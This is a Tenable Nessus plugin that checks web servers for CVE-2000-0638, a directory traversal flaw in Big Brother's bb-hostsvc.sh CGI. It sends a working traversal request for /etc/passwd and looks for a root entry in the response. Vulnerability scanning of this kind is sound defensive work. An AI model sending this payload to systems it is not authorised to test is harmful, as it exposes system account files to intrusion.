#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10460);
 script_bugtraq_id(1455);
 script_osvdb_id(359);
 script_version ("$Revision: 1.31 $");
 script_cve_id("CVE-2000-0638");

 script_name(english:"Big Brother bb-hostsvc.sh 'HOSTSVC' Parameter Traversal Arbitrary File Access");
 script_summary(english:"Read arbitrary files using the CGI bb-hostsvc.sh.");

 script_set_attribute( attribute:"synopsis", value:
"A web application running on the remote host is affected by a
directory traversal vulnerability." );
 script_set_attribute(   attribute:"description",   value:
"The version of Big Brother running on the remote host is affected by a
directory traversal vulnerability in the 'HOSTSVC' parameter of the
'bb-hostsvc.sh' CGI. A remote attacker can exploit this to read
sensitive information from the system." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Jul/167"
 );
 script_set_attribute(
   attribute:"solution",
   value:"Upgrade to Big Brother 1.4h or later."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:C");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/07/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/07/11");

 script_cvs_date("$Date: 2016/11/15 13:39:08 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
  
 script_copyright("This script is Copyright (C) 2000-2016 Tenable Network Security, Inc."); 

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 url = string(dir, "/bb-hostsvc.sh?HOSTSVC=../../../../../etc/passwd");
 res = http_send_recv3(method:"GET", item:url, port:port);
 if (isnull(res)) exit(0);

 if(egrep(pattern:"root:.*:0:[01]", string:res[2]))
 {  
  security_warning(port);
  exit(0);
 }
}
